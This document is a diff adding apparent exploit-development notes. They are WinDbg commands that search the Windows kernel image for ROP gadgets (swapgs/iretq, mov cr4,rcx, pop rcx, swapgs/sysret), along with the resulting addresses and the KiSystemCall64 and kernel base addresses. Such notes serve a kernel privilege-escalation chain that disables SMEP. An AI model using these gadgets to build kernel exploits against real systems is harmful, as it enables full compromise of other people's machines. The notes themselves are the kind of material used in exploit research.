@@ -1,0 +1,19 @@
+# swapgs iretq
+s -b nt L?7fffffff 0f 01 f8 48 cf
+> 0xfffff804b58a1cf3
+
+# mov cr4 rcx
+s -b nt L?7fffffff 0f 22 e1 c3
+> 0xfffff804b56b1ac7
+
+# pop rcx
+s -b nt L?7fffffff 59 c3
+> 0xfffff804b5218969
+
+# swapgs sysret
+s -b nt L?7fffffff 0f 01 f8 48 0f 07
+> 0xfffff804b58a2da5
+
+
+KiSystemCAll64 = 0xfffff804b58b5240
+kernel_base = 0xfffff804b5202700
